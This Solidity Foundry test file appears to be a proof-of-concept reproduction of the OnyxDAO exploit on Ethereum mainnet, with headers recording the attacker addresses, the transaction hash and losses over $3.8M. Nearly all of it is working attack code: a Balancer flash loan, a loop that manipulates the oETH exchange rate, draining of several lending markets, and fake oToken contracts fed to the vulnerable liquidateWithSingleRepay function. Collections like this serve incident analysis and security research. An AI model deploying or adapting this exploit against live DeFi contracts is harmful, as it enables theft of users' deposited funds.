// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 4.1M VUSD, 7.35M XCN, 5K DAI, 0.23 WBTC, 50K USDT (>$3.8M USD)
// Attacker : https://etherscan.io/address/0x680910cf5fc9969a25fd57e7896a14ff1e55f36b
// Attack Contract :
//      - Main: https://etherscan.io/address/0xa57eda20be51ae07df3c8b92494c974a92cf8956
//      - Rate Manipulator: https://etherscan.io/address/0xae7d68b140ed075e382e0a01d6c67ac675afa223
//      - Fake oTokenRepay: https://etherscan.io/address/0x4f8b8c1b828147c1d6efc37c0326f4ac3e47d068
//      - Fake underlying: https://etherscan.io/address/0x3f100c9e9b9c575fe73461673f0770435575dc0e
//      - Fake oTokenCollateral: https://etherscan.io/address/0xad45812c62fcbc8d54d0cc82773e85a11f19a248
// Vulnerable Contract : (NFTLiquidation) https://etherscan.io/address/0xf10bc5be84640236c71173d1809038af4ee19002
// Attack Tx : https://etherscan.io/tx/0x46567c731c4f4f7e27c4ce591f0aebdeb2d9ae1038237a0134de7b13e63d8729
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xf10bc5be84640236c71173d1809038af4ee19002#code
// L671-678, liquidateWithSingleRepay() function
// @POC Author : [rotcivegaf](https://twitter.com/rotcivegaf)

// Contracts involved
address constant balancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant oETH = 0x2CCb7d00a9E10D0c3408B5EEfb67011aBfaCb075;
address constant Unitroller = 0xcC53F8fF403824a350885A345ED4dA649e060369;
address constant oXCN = 0xBD20ae088deE315ace2C08Add700775F461fEa64;
address constant oDAI = 0xF3354d3e288CE599988e23f9ad814Ec1b004d74a;
address constant oBTC = 0x7a89e16Cc48432917C948437AC1441b78D133A16;
address constant oUSDT = 0x2C6650126B6E0749f977D280c98415ed05894711;
address constant oVUSD = 0xeE894c051c402301bC19bE46c231D2a8E38b0451;
address constant VUSD = 0x0BFFDD787C83235f6F0afa0Faed42061a4619B7a;
address constant NFTLiquidationProxy = 0x323398DE3C35F96053D930d25FE8d92132F83d44;
address constant uniV3Router = 0xE592427A0AEce92De3Edee1F18E0157C05861564;

address constant XCN = 0xA2cd3D43c775978A96BdBf12d733D5A1ED94fb18;
address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
address constant BTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
address constant _USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

contract OnyxDAO_exp is Test {
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork("mainnet", 20_834_658 - 1);
    }

    function testPoC() public {
        vm.startPrank(attacker);
        AttackerC attackerC = new AttackerC();

        // tx:
        attackerC.attack();

        console.log("Final balance in VUSD :", IERC20(VUSD).balanceOf(address(attacker)));
        console.log("Final balance in XCN:", IERC20(XCN).balanceOf(address(attacker)));
        console.log("Final balance in DAI:", IERC20(DAI).balanceOf(address(attacker)));
        console.log("Final balance in WBTC:", IERC20(BTC).balanceOf(address(attacker)));
        console.log("Final balance in USDT:", IERC20(_USDT).balanceOf(address(attacker)));
    }
}

contract AttackerC {
    address attacker;

    function attack() external {
        attacker = msg.sender;

        address[] memory tokens = new address[](1);
        tokens[0] = weth;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 2000 ether;
        IFS(balancerVault).flashLoan( // L2
            address(this),
            tokens,
            amounts,
            hex"3030" // WHY????
        );
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        uint256 balWETH = IERC20(weth).balanceOf(address(this)); // L7

        IFS(weth).withdraw(balWETH); // L8
        uint256 cashOETH1 = IFS(oETH).getCash(); // L11
        IFS(oETH).mint{value: balWETH - 0.5 ether}(); // L12

        address[] memory markets = IFS(Unitroller).getAllMarkets(); // L22
        IFS(Unitroller).enterMarkets(markets); // L24 WHY?

        uint256 cashOETH2 = IFS(oETH).getCash(); // L36
        IFS(oETH).borrow(cashOETH1); // L37
        // go to fallback

        uint256 cash0 = IFS(oXCN).getCash(); // L201
        IFS(oXCN).borrow(cash0); // L205
        address underlying0 = IFS(oXCN).underlying(); // L381
        IFS(underlying0).transfer(attacker, cash0); // L382

        uint256 cash1 = IFS(oDAI).getCash(); // L384
        IFS(oDAI).borrow(cash1); // L388
        address underlying1 = IFS(oDAI).underlying(); // L564
        IFS(underlying1).transfer(attacker, cash1); // L565

        uint256 cash2 = IFS(oBTC).getCash(); // L567
        IFS(oBTC).borrow(cash2); // L571
        address underlying2 = IFS(oBTC).underlying(); // L747
        IFS(underlying2).transfer(attacker, cash2); // L748

        uint256 cash3 = IFS(oUSDT).getCash(); // L750
        IFS(oUSDT).borrow(cash3); // L754
        address underlying3 = IFS(oUSDT).underlying(); // L930
        IUSDT(underlying3).transfer(attacker, cash3); // L931

        (, uint256 liq,) = IFS(Unitroller).getAccountLiquidity(address(this)); // L933

        address ChainlinkOracle = IFS(Unitroller).oracle(); // L1183
        uint256 uPrice = IFS(ChainlinkOracle).getUnderlyingPrice(oVUSD); // L1185
        IFS(oVUSD).borrow(liq / 1e12); // L1091

        AttackerC2 attackerC2 = new AttackerC2();
        payable(address(attackerC2)).transfer(0.5 ether);
        attackerC2.attack();

        address fake_underlying = address(new Fake_underlying());
        address fake_oTokenCollateral = address(new Fake_oTokenCollateral());
        address fake_oTokenRepay = address(new Fake_oTokenRepay(fake_underlying, address(this)));

        IFS(VUSD).transfer(fake_oTokenRepay, 1); // L2313

        IFS(NFTLiquidationProxy).liquidateWithSingleRepay( // L2316
        payable(address(this)), fake_oTokenCollateral, fake_oTokenRepay, 4_764_735_291_322);
        IFS(VUSD).approve(uniV3Router, 300_000_000_000);

        IFS.ExactInputSingleParams memory input = IFS.ExactInputSingleParams( // L2712
            VUSD, // address tokenIn;
            weth, // address tokenOut;
            3000, // uint24 fee;
            address(this), // address recipient;
            1_727_352_120, // uint256 deadline;
            300_000_000_000, // uint256 amountIn;
            0, // uint256 amountOutMinimum;
            0 // uint160 sqrtPriceLimitX96;
        );

        IFS(uniV3Router).exactInputSingle(input); // L2712

        IFS(weth).deposit{value: address(this).balance}(); // L2725

        IFS(weth).transfer(balancerVault, 2000 ether); // L2727

        uint256 BalVUSD = IFS(VUSD).balanceOf(address(this)); // L2729

        IFS(VUSD).transfer(attacker, BalVUSD); // L2731
    }

    receive() external payable {}
}

contract AttackerC2 {
    function attack() external {
        uint256 x = 215_227_348 + 1;
        uint256 y = 330_454_691 + 10;

        IFS _oETH = IFS(oETH);
        _oETH.exchangeRateStored(); // view
        oETH.call{value: x}("");

        for (uint256 i; i < 54; i++) {
            _oETH.exchangeRateStored(); // view
            _oETH.redeemUnderlying(y);
            _oETH.exchangeRateStored(); // view
            oETH.call{value: x}("");
        }

        _oETH.exchangeRateStored(); // view
        _oETH.redeemUnderlying(y);
        payable(address(msg.sender)).transfer(address(this).balance);
    }

    receive() external payable {}
}

contract Fake_oTokenRepay {
    address fake_underlying;
    address attackerC;

    constructor(address _fake_underlying, address _attackerC) {
        fake_underlying = _fake_underlying;
        attackerC = _attackerC;
    }

    function borrowBalanceCurrent(
        address
    ) external returns (uint256) {
        return 0;
    }

    function underlying() external view returns (address) {
        return fake_underlying;
    }

    function liquidateBorrow(address, uint256, address) external returns (uint256) {
        return 0;
    }

    function mint(
        uint256
    ) external returns (bool) {
        return false;
    }

    function balanceOf(
        address
    ) external returns (uint256) {
        return 0;
    }

    function transfer(address, uint256) external returns (bool) {
        IFS(VUSD).approve(oVUSD, type(uint256).max); // L2477
        IFS(oVUSD).liquidateBorrow(attackerC, 1, oETH); // L2480
        uint256 bal_oETH = IFS(oETH).balanceOf(address(this)); // L2691
        IFS(oETH).redeem(bal_oETH); // L2692
        payable(attackerC).transfer(address(this).balance);
        return true;
    }

    receive() external payable {}
}

contract Fake_underlying {
    function transferFrom(address, address, uint256) external returns (bool) {
        return true;
    }

    function approve(address, uint256) external returns (bool) {
        return true;
    }

    function transfer(address, uint256) external returns (bool) {
        return true;
    }
}

contract Fake_oTokenCollateral {
    function balanceOf(
        address
    ) external returns (uint256) {
        return 0;
    }

    function underlying() external view returns (address) {
        return address(this);
    }
}

interface IFS is IERC20 {
    // balancerVault
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;

    // WETH
    function withdraw(
        uint256 wad
    ) external;
    function deposit() external payable;

    // OEther / OErc20Delegate
    function getCash() external view returns (uint256);
    function mint() external payable;
    function borrow(
        uint256 borrowAmount
    ) external returns (uint256);
    function underlying() external view returns (address);
    function exchangeRateStored() external view returns (uint256);
    function redeemUnderlying(
        uint256 redeemAmount
    ) external returns (uint256);

    // Unitroller
    function getAllMarkets() external view returns (address[] memory);
    function enterMarkets(
        address[] calldata oTokens
    ) external returns (uint256[] memory);
    function getAccountLiquidity(
        address account
    ) external view returns (uint256, uint256, uint256);
    function oracle() external view returns (address);

    // ChainlinkOracle
    function getUnderlyingPrice(
        address oToken
    ) external view returns (uint256);

    // NFTLiquidationProxy
    function liquidateWithSingleRepay(
        address payable borrower,
        address oTokenCollateral,
        address oTokenRepay,
        uint256 repayAmount
    ) external payable;

    // Uniswap V3: SwapRouter
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external payable returns (uint256 amountOut);

    // oVUSD
    function liquidateBorrow(
        address borrower,
        uint256 repayAmount,
        address oTokenCollateral
    ) external returns (uint256);

    // oETH
    function redeem(
        uint256 redeemTokens
    ) external returns (uint256);
}
